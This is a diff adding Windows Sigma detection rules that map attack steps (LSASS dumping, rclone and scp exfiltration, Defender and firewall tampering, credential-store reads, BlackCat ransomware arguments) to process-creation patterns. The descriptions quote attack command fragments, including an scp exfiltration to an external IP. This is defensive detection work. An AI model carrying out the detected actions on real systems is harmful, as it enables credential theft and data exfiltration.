+  product: windows
+  category: process_creation
+detection:
+  selection_reg_aslr:
+    Image|endswith: '\reg.exe'
+    CommandLine|contains: 'add'
+  selection_reg_aslr_keys:
+    Image|endswith: '\reg.exe'
+    CommandLine|contains:
+      - 'MoveImages'
+      - 'ProcessEnableVa'
+      - 'MitigationOptions'
+  selection_powershell_cfg:
+    Image|endswith: '\powershell.exe'
+    CommandLine|contains:
+      - 'ProcessMitigationPolicy'
+      - 'Set-ProcessMitigation'
+      - 'DisableExtensionPoints'
+  condition: (selection_reg_aslr and selection_reg_aslr_keys) or selection_powershell_cfg
+falsepositives:
+  - Security policy configuration scripts (unlikely to disable mitigations)
+level: high
+x-gbse-telemetry: [file, process]
+x-gbse-steps: [15]
+
+---
+
+title: ProcDump or Task Manager LSASS Full Memory Dump
+id: bcd0f32b-e6ab-4bfa-a2b2-9e793d31bd0e
+name: W11
+status: experimental
+description: >
+  Detects procdump.exe creating a full memory dump of lsass.exe, the Windows
+  equivalent of gcore on Linux for credential extraction (T1003.001).
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/05
+tags:
+  - attack.credential_access
+  - attack.t1003.001
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection_procdump:
+    Image|endswith:
+      - '\procdump.exe'
+      - '\procdump64.exe'
+    CommandLine|contains: '-ma'
+  selection_procdump_lsass:
+    Image|endswith:
+      - '\procdump.exe'
+      - '\procdump64.exe'
+    CommandLine|contains:
+      - 'lsass'
+      - 'lsass.exe'
+  selection_dump_staging:
+    CommandLine|contains:
+      - '-o %TEMP%'
+      - '-o C:\Windows\Temp'
+      - '-o C:\ProgramData'
+  condition: (selection_procdump and selection_procdump_lsass) or selection_dump_staging
+falsepositives:
+  - Authorized forensic memory capture during incident response
+level: critical
+x-gbse-telemetry: [file, process]
+x-gbse-steps: [16]
+
+---
+
+title: rclone Copy Exfiltration to Named Remote
+id: e2d3c518-9f47-4e73-a541-b8d0f2e3ff93
+name: W12
+status: experimental
+description: >
+  Detects rclone.exe copying files to a named remote endpoint (webdav:, s3:, etc.)
+  Windows equivalent of rclone copy /tmp/lsass_dump.000 webdav: (T1048.003).
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/05
+tags:
+  - attack.exfiltration
+  - attack.t1048.003
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection:
+    Image|endswith: '\rclone.exe'
+    CommandLine|contains:
+      - ' copy '
+      - ' sync '
+      - ' move '
+  condition: selection
+falsepositives:
+  - Legitimate scheduled rclone backup jobs
+level: medium
+x-gbse-telemetry: [file, network, process]
+x-gbse-steps: [17]
+
+---
+
+title: nmap or Network Port Scanner Execution on Windows
+id: 4fc77b10-e79a-4657-93be-35d41bb7e5cd
+name: W13
+status: experimental
+description: >
+  Detects nmap.exe or similar port scanners performing network discovery on
+  Windows. Windows equivalent of nmap -sn ping sweep (T1046).
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/05
+tags:
+  - attack.discovery
+  - attack.t1046
+  - attack.reconnaissance
+  - attack.t1595.001
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection:
+    Image|endswith:
+      - '\nmap.exe'
+      - '\masscan.exe'
+      - '\zmap.exe'
+  selection_advanced_ip:
+    Image|endswith: '\arp-scan.exe'
+  condition: 1 of selection*
+falsepositives:
+  - Authorized network vulnerability scanning and inventory
+level: medium
+x-gbse-telemetry: [network, process]
+x-gbse-steps: [19]
+
+---
+
+title: PsExec or Admin Share Lateral Tool Deployment
+id: 93be11dd-8f2e-4cca-bf6f-163235bd8bec
+name: W14
+status: experimental
+description: >
+  Detects PsExec or net.exe deploying tools to Windows admin shares (C$, ADMIN$)
+  across multiple internal hosts. Windows equivalent of scp batch deployment
+  via for-loop (T1077).
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/05
+tags:
+  - attack.lateral_movement
+  - attack.t1077
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection_psexec:
+    Image|endswith: '\psexec.exe'
+    CommandLine|contains: '\\'
+  selection_copy_admin_share:
+    Image|endswith: '\cmd.exe'
+    CommandLine|contains|all:
+      - 'copy'
+      - 'C$'
+  condition: 1 of selection_*
+falsepositives:
+  - Legitimate PsExec-based deployment in managed enterprise environments
+level: high
+x-gbse-telemetry: [file, identity, network, process]
+x-gbse-steps: [20]
+
+---
+
+title: PowerShell or PE Execution from Temp Path
+id: 447a64a4-4741-4a09-a3cb-6e307f1c8d6a
+name: W15
+status: experimental
+description: >
+  Detects PowerShell executing scripts or binaries directly from %TEMP% or
+  staging paths, including BlackCat ransomware with --access-token.
+  Windows equivalent of /tmp/collector1.exe and wine digirevenge.exe (T1059.001).
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/05
+tags:
+  - attack.execution
+  - attack.t1059.001
+  - attack.impact
+  - attack.t1486
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection_blackcat:
+    CommandLine|contains|all:
+      - '--access-token'
+      - '--no-prop-flags'
+  selection_temp_pe:
+    Image|startswith:
+      - 'C:\Windows\Temp\'
+      - 'C:\Users\Public\'
+      - 'C:\ProgramData\'
+    Image|endswith: '.exe'
+  selection_temp_powershell:
+    Image|endswith: '\powershell.exe'
+    CommandLine|contains:
+      - '%TEMP%'
+      - 'C:\Windows\Temp'
+  condition: 1 of selection_*
+falsepositives:
+  - Legitimate installer packages that extract and run from temp directories
+level: high
+x-gbse-telemetry: [file, process]
+x-gbse-steps: [21, 27]
+
+---
+
+title: pscp.exe or WinSCP SCP File Transfer
+id: 2d9d48d4-84fe-47bf-bf9a-11cc0c4e3e6b
+name: W16
+status: experimental
+description: >
+  Detects pscp.exe (PuTTY SCP) or psftp.exe transferring files to/from remote
+  hosts. Windows equivalent of scp lateral transfer and log retrieval (T1021.004).
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/05
+tags:
+  - attack.command_and_control
+  - attack.t1021.004
+  - attack.t1105
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection:
+    Image|endswith:
+      - '\pscp.exe'
+      - '\psftp.exe'
+      - '\WinSCP.exe'
+  condition: selection
+falsepositives:
+  - Legitimate use of PuTTY/WinSCP by administrators for file transfers
+level: medium
+x-gbse-telemetry: [file, identity, network, process]
+x-gbse-steps: [23, 25]
+
+---
+
+title: CMD Inline Command via SSH Channel Remote Execution
+id: b13f0908-d11d-42c3-a073-5fd3e6cf2f63
+name: W17
+status: experimental
+description: >
+  Detects cmd.exe or PowerShell executed with inline -c/-Command parameter
+  as part of a remote SSH channel, equivalent of ssh -t chmod+x && sudo execution.
+  Windows analog to SSH remote shell execution (T1059.004/T1059.003).
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/05
+tags:
+  - attack.execution
+  - attack.t1059.004
+  - attack.t1059.003
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection_cmd_inline:
+    Image|endswith: '\cmd.exe'
+    CommandLine|contains:
+      - '/c chmod'
+      - '/c sudo'
+      - 'access-token'
+  selection_ps_bypass:
+    Image|endswith: '\powershell.exe'
+    CommandLine|contains:
+      - '-EncodedCommand'
+      - '-enc '
+      - 'bypass'
+  condition: 1 of selection_*
+falsepositives:
+  - Legitimate automation scripts using inline command execution
+level: medium
+x-gbse-telemetry: [file, network, process]
+x-gbse-steps: [24]
+
+---
+
+title: net.exe Admin Share File Discovery and Collection
+id: b3f43f5a-cca9-4ec4-bed9-31f8bb8f99e9
+name: W18
+status: experimental
+description: >
+  Detects net.exe or dir commands traversing Windows admin shares to locate and
+  retrieve files. Windows equivalent of smbclient /C$ get collection (T1083).
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/05
+tags:
+  - attack.collection
+  - attack.t1083
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection_dir_share:
+    Image|endswith: '\cmd.exe'
+    CommandLine|contains|all:
+      - 'dir'
+      - '\C$'
+  selection_copy_share:
+    Image|endswith:
+      - '\cmd.exe'
+      - '\robocopy.exe'
+    CommandLine|contains:
+      - '\\C$\Windows\System32'
+      - 'clog.xtlog'
+      - 'bc.log'
+  condition: 1 of selection_*
+falsepositives:
+  - IT administrators browsing admin shares for file management
+level: medium
+x-gbse-telemetry: [file, identity, network, process]
+x-gbse-steps: [28]
+
+---
+
+title: robocopy or xcopy External Host Exfiltration
+id: 6f240e91-9d97-4fc3-8120-2ef6edeb4d4e
+name: W19
+status: experimental
+description: >
+  Detects robocopy.exe, xcopy.exe, or cmd.exe copying archive files to an
+  external host or UNC path. Windows equivalent of scp $zipPath op1@176.59.1.18
+  exfiltration (T1048.001).
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/05
+tags:
+  - attack.exfiltration
+  - attack.t1048.001
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection_robocopy:
+    Image|endswith: '\robocopy.exe'
+    CommandLine|contains: '\\'
+  selection_zip_external:
+    Image|endswith:
+      - '\cmd.exe'
+      - '\xcopy.exe'
+    CommandLine|contains:
+      - '.zip'
+      - 'sblogs'
+  condition: 1 of selection_*
+falsepositives:
+  - Legitimate scheduled backup jobs using robocopy to network shares
+level: high
+x-gbse-telemetry: [file, identity, network, process]
+x-gbse-steps: [29]
+
+
+---
+
+title: OpenSSH scp.exe Secure Copy Transfer or Exfiltration to Remote Host
+id: a7ffa808-2681-4c68-be63-79b68eb8e013
+name: W20
+status: experimental
+description: >
+  Detects the native Windows OpenSSH client scp.exe copying files to or from a
+  remote host (user@host:path). Covers lateral tool transfer, collection pull
+  and archive exfiltration. Native-Windows tradecraft equivalent of the Linux
+  scp steps that the PuTTY/robocopy rules (W16/W19) do not match.
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/09
+tags:
+  - attack.lateral_movement
+  - attack.exfiltration
+  - attack.t1021.004
+  - attack.t1105
+  - attack.t1048.001
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection_scp:
+    Image|endswith: '\\scp.exe'
+    CommandLine|contains: '@'
+  filter_help:
+    CommandLine|contains:
+      - ' --help'
+      - ' -h '
+  condition: selection_scp and not filter_help
+falsepositives:
+  - Administrators using OpenSSH scp for legitimate file management to known internal hosts
+level: high
+x-gbse-telemetry: [file, identity, network, process]
+x-gbse-steps: [23, 25, 29]
+
+---
+
+title: OpenSSH ssh.exe Interactive Remote Command Execution
+id: 195e9ef8-f7af-4eed-bd82-f10efd943cfc
+name: W21
+status: experimental
+description: >
+  Detects the native Windows OpenSSH client ssh.exe executing an inline
+  command on a remote host (ssh -t user@host "cmd"). Native-Windows equivalent
+  of the Linux ssh remote-exec step; not covered by the cmd.exe/powershell
+  rule W17.
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/09
+tags:
+  - attack.lateral_movement
+  - attack.execution
+  - attack.t1021.004
+  - attack.t1059.004
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection_ssh:
+    Image|endswith: '\\ssh.exe'
+    CommandLine|contains: '@'
+  selection_inline:
+    Image|endswith: '\\ssh.exe'
+    CommandLine|contains:
+      - 'chmod'
+      - 'sudo'
+      - '&&'
+      - ' -t '
+  condition: selection_ssh and selection_inline
+falsepositives:
+  - Administrators running remote maintenance commands over SSH
+level: high
+x-gbse-telemetry: [file, identity, network, process]
+x-gbse-steps: [24]
+
+---
+
+title: wget.exe or curl.exe LOLbin Ingress Tool Transfer
+id: e1944df9-2968-4ce9-8a03-ffa5845c9aa0
+name: W22
+status: experimental
+description: >
+  Detects the portable downloaders wget.exe or curl.exe (cross-platform
+  binaries available on Windows) retrieving a remote payload over HTTP(S).
+  Native-Windows equivalent of the Linux wget download step; the
+  bitsadmin/certutil rule W07 does not match these binaries.
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/09
+tags:
+  - attack.command_and_control
+  - attack.t1105
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection_download:
+    Image|endswith:
+      - '\\wget.exe'
+      - '\\curl.exe'
+    CommandLine|contains:
+      - 'http://'
+      - 'https://'
+  filter_legit:
+    CommandLine|contains:
+      - 'windowsupdate'
+      - 'microsoft.com'
+      - 'windows.com'
+  condition: selection_download and not filter_legit
+falsepositives:
+  - Developer tooling or scripts fetching artefacts from trusted internal mirrors
+level: medium
+x-gbse-telemetry: [file, network, process]
+x-gbse-steps: [22]
+
+---
+
+title: Native Firewall Disable or Microsoft Defender Tampering
+id: 68cebf04-a80d-4ee5-9c61-1cfaf4113b79
+name: W23
+status: experimental
+description: >
+  Detects defense-evasion via native Windows configuration: netsh advfirewall
+  turning the firewall off, or Set-/Add-MpPreference disabling Defender real-
+  time monitoring or adding exclusions. Equivalent of the Linux
+  netsh/systemctl firewall-disable and Defender-tamper steps; the AV-process-
+  kill rule W09 (sc.exe/taskkill) does not match these.
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/09
+tags:
+  - attack.defense_evasion
+  - attack.t1562.001
+  - attack.t1562.004
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection_netsh_fw:
+    Image|endswith: '\\netsh.exe'
+    CommandLine|contains|all:
+      - 'advfirewall'
+      - 'off'
+  selection_defender:
+    Image|endswith: '\\powershell.exe'
+    CommandLine|contains:
+      - 'Set-MpPreference'
+      - 'DisableRealtimeMonitoring'
+      - 'Add-MpPreference -ExclusionPath'
+      - '-DisableBehaviorMonitoring'
+  condition: 1 of selection_*
+falsepositives:
+  - Endpoint administrators reconfiguring the firewall or Defender during sanctioned maintenance
+level: high
+x-gbse-telemetry: [file, process]
+x-gbse-steps: [13, 14]
+
+---
+
+title: PowerSploit Invoke-Portscan Network Service Discovery
+id: fb76a323-1458-49af-8048-3d2170b9bfef
+name: W24
+status: experimental
+description: >
+  Detects PowerShell-based network scanning via PowerSploit Invoke-Portscan
+  (or Invoke-ArpScan / Test-NetConnection sweeps). Equivalent of the Linux
+  nmap step; the binary-scanner rule W13 (nmap/masscan/zmap/arp-scan .exe)
+  does not match a PowerShell cmdlet.
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/09
+tags:
+  - attack.discovery
+  - attack.t1046
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection:
+    Image|endswith: '\\powershell.exe'
+    CommandLine|contains:
+      - 'Invoke-Portscan'
+      - 'Invoke-ArpScan'
+      - 'Invoke-PortScan'
+  condition: selection
+falsepositives:
+  - Authorised internal vulnerability scanning using PowerShell tooling
+level: medium
+x-gbse-telemetry: [network, process]
+x-gbse-steps: [19]
+
+---
+
+title: PE Execution from User-Writable Temp Path or BlackCat Token Arguments
+id: d4af6874-6ffe-4909-8982-e7a656ac0303
+name: W25
+status: experimental
+description: >
+  Detects execution of a PE from a user-writable staging directory including
+  AppData\Local\Temp (extends W15, which omitted AppData\Local\Temp), or any
+  process invoked with the ALPHV/BlackCat encryptor argument pair --access-
+  token / --no-prop-flags.
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/09
+tags:
+  - attack.execution
+  - attack.impact
+  - attack.t1059.001
+  - attack.t1486
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection_temp_pe:
+    Image|contains:
+      - '\\AppData\\Local\\Temp\\'
+      - '\\Windows\\Temp\\'
+      - '\\Users\\Public\\'
+      - '\\ProgramData\\'
+    Image|endswith: '.exe'
+  selection_blackcat:
+    CommandLine|contains:
+      - '--access-token'
+      - '--no-prop-flags'
+  condition: 1 of selection_*
+falsepositives:
+  - Portable applications legitimately executed from a user profile temp directory
+level: high
+x-gbse-telemetry: [file, network, process]
+x-gbse-steps: [27]
+
+---
+
+title: Non-Standard InfoStealer Binary LSASS or Credential Access
+id: 1c19e1d0-1508-442e-b0a2-4f29f8fcdeeb
+name: W26
+status: experimental
+description: >
+  Detects credential access by a non-standard stealer binary (e.g.
+  netbnmp.exe) invoked with a base64 routine against a local target, a pattern
+  outside the procdump/mimikatz/dpapi coverage of W08. Maps to OS credential
+  dumping from LSASS-adjacent stores.
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/09
+tags:
+  - attack.credential_access
+  - attack.t1003.001
+  - attack.t1555
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection_stealer:
+    Image|endswith:
+      - '\\netbnmp.exe'
+      - '\\stealer.exe'
+      - '\\infostealer.exe'
+    CommandLine|contains: 'base64'
+  selection_behaviour:
+    CommandLine|contains|all:
+      - 'base64'
+      - 'localhost'
+  condition: 1 of selection_*
+falsepositives:
+  - Bespoke internal tooling that legitimately base64-encodes local data (rare)
+level: high
+x-gbse-telemetry: [file, identity, process]
+x-gbse-steps: [9]
+
+---
+
+title: Cross-Platform C2 Server Binary Execution from Resource Path
+id: 774acb91-fb4e-4c45-acc3-4196f5d8b86b
+name: W27
+status: experimental
+description: >
+  Detects execution of an attacker control-server binary lacking a .exe
+  extension (e.g. controlServer) from a build/resource directory such as
+  control_server, a cross-platform construct retained on the Windows host. Not
+  matched by W02, which keys on Server.exe/Controller.exe in Windows staging
+  paths.
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/09
+tags:
+  - attack.command_and_control
+  - attack.t1105
+  - attack.t1071.001
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection_bin:
+    Image|endswith:
+      - '\\controlServer'
+      - '\\controlServer.exe'
+      - '\\controller'
+      - '\\handler'
+  selection_path:
+    CommandLine|contains|all:
+      - 'control_server'
+  condition: 1 of selection_*
+falsepositives:
+  - Internal client-server applications using a control_server build directory
+level: medium
+x-gbse-telemetry: [file, network, process]
+x-gbse-steps: [2]
+
+---
+
+title: PowerShell Get-ChildItem Admin-Share File Discovery
+id: 2f3152e4-b0e7-4aa2-aaa4-5284ee8b2758
+name: W28
+status: experimental
+description: >
+  Detects PowerShell Get-ChildItem (gci/dir alias) enumerating files on an
+  administrative share (C$\Windows\System32) or targeting known log artefacts.
+  Equivalent of the Linux file-discovery step; the cmd.exe/robocopy rule W18
+  does not match the PowerShell cmdlet.
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/09
+tags:
+  - attack.discovery
+  - attack.t1083
+  - attack.t1135
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection_gci:
+    Image|endswith: '\\powershell.exe'
+    CommandLine|contains:
+      - 'Get-ChildItem'
+      - 'gci '
+      - '-Path '
+  selection_target:
+    CommandLine|contains:
+      - 'C$\\'
+      - 'clog.xtlog'
+      - 'bc.log'
+      - '\\Windows\\System32'
+  condition: selection_gci and selection_target
+falsepositives:
+  - Administrators enumerating admin-share contents during legitimate troubleshooting
+level: medium
+x-gbse-telemetry: [file, network, process]
+x-gbse-steps: [28]
+
+---
+
+title: External Remote Services Enablement or Exposure (RDP/SSH)
+id: e722d390-7581-4595-a336-cad450f91ded
+name: W29
+status: experimental
+description: >
+  Coverage rule R17 (gold-control gap, T1133): detects enabling or exposing
+  external remote services - turning on RDP via fDenyTSConnections=0, opening
+  TCP 3389 in the firewall, or starting the sshd service - the technique
+  present at gold-control step 1 that the 29-step Linux variant reassigns to
+  T1048.003 and therefore omits from the per-step library.
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/09
+tags:
+  - attack.initial_access
+  - attack.persistence
+  - attack.t1133
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection_rdp_reg:
+    Image|endswith:
+      - '\\reg.exe'
+      - '\\powershell.exe'
+    CommandLine|contains|all:
+      - 'fDenyTSConnections'
+      - '0'
+  selection_fw_rdp:
+    Image|endswith: '\\netsh.exe'
+    CommandLine|contains:
+      - '3389'
+      - 'RemoteDesktop'
+  selection_sshd:
+    Image|endswith:
+      - '\\sc.exe'
+      - '\\powershell.exe'
+    CommandLine|contains|all:
+      - 'sshd'
+      - 'start'
+  condition: 1 of selection_*
+falsepositives:
+  - Administrators enabling RDP or SSH for sanctioned remote access
+level: high
+x-gbse-telemetry: [identity, network, process]
+x-gbse-steps: []
+
+---
+
+title: Credentials from Password Stores Access
+id: ce41f635-5c76-4752-9cd2-8da70883bec6
+name: W30
+status: experimental
+description: >
+  Coverage rule R18 (gold-control gap, T1555): detects access to OS or browser
+  credential stores - vaultcmd /list, Credential Manager via rundll32
+  keymgr.dll, PowerShell credential enumeration, or reads of browser Login
+  Data / Local State - the technique present at gold-control step 7 that the
+  29-step Linux variant reassigns to T1018 and therefore omits from the per-
+  step library.
+author: Ahmed Elmesiry, Fujitsu Research of Europe
+date: 2026/06/09
+tags:
+  - attack.credential_access
+  - attack.t1555
+  - attack.t1555.003
+logsource:
+  product: windows
+  category: process_creation
+detection:
+  selection_vaultcmd:
+    Image|endswith: '\\vaultcmd.exe'
+    CommandLine|contains: '/list'
+  selection_credman:
+    Image|endswith:
+      - '\\rundll32.exe'
+      - '\\powershell.exe'
+    CommandLine|contains:
+      - 'keymgr.dll'
+      - 'CredEnumerate'
+      - 'Get-StoredCredential'
+      - 'vault::cred'
+  selection_browser:
+    CommandLine|contains:
+      - '\\Login Data'
+      - '\\Local State'
+      - '\\Web Data'
+  condition: 1 of selection_*
+falsepositives:
+  - Password managers or backup tooling legitimately reading credential stores
+level: high
+x-gbse-telemetry: [file, identity, process]
+x-gbse-steps: []
